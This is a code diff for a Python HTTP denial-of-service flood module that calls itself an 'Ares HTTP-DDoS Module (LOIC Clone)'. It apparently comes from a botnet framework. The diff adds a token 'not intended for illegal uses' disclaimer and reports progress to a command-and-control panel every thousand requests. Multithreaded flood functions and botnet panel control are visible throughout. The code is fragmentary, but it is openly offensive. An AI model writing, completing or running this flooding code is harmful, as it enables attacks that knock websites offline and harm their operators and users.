@@ -1,12 +1,16 @@
-# Ares HTTP-DDoS Module
+# Ares HTTP-DDoS Module (LOIC Clone)
 # Pythogen
 # Build 1.2
+
+# Not intended for illegal uses.
 
 # 12/27/2015 - 4:34 PM - Bug fix: DDoS completion notice now correctly synchronized.
 
 # 12/27/2015 - 4:42 PM - Update: Functional stop feature now included.
 
 # 12/29/2015 - 1:01 PM - Update: Functionality refinement. Clean up syntax.
+
+# 12/29/2015 - 2:58 PM - Update: Informs when every thousand requests have been sent until completion. (Panel Feedback)
 
 # Panel commands:
 
@@ -42,13 +46,11 @@ from sys import stdout, argv
 # - Stress functions -
 
 def complete():
-    # Globalize increment variable
-    global inc
-
     # Announce completion
     utils.send_output("DDoS Complete.")
 
 
+# Note: 10 Threads
 def auto_send_request(server, number_of_requests=10):
     # Globalize increment variable
     global inc
@@ -71,6 +73,11 @@ def auto_send_request(server, number_of_requests=10):
 
                 # Increment ++
                 inc = inc + 1 # Count total requests sent
+
+                # Live display every thousand requests. 
+                if inc % 1000 == 0:
+                    utils.send_output("Requests: %s." % (inc))
+
 
             # if not active then break ..
             elif isDos == False:
@@ -104,7 +111,7 @@ def flood(url, number_of_requests = 1000, number_of_threads = 50):
 # - Command control -
 
 def run(action, num_req):    
-    # Globalize increment and request variables
+    # Globalize variables
     global requests
     global inc
     global isDos
